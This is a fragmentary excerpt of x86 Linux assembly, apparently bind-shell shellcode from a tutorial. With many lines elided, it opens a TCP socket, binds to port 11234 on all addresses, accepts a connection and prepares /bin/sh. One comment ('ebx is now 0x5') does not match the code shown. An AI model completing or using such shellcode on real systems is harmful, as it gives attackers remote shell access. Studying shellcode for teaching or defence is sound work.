...
_start:
	...
	xor ecx, ecx
        ...
        push byte 0x6           ; push 0x6 to stack (IPPROTO_TCP)
        push byte 0x1           ; push 1 to stack (SOCK_STREAM)
        push byte 0x2           ; push 2 to stack (AF_INET)
        ...
        xor ebx, ebx
        push ebx                ; push zeroes for our bind address (0.0.0.0)
        push word 0xe22b        ; push port number 11234 in reverse
        ...
        push edx                ; pointer to socket
        mov al, 0x66            ; socketcall
        inc bl                  ; ebx is now 0x5, which is sys_accept
	...
	xor edi, edi		; zero out register just to make sure
        ...
        push edi                ; push pointer to /bin/sh onto stack
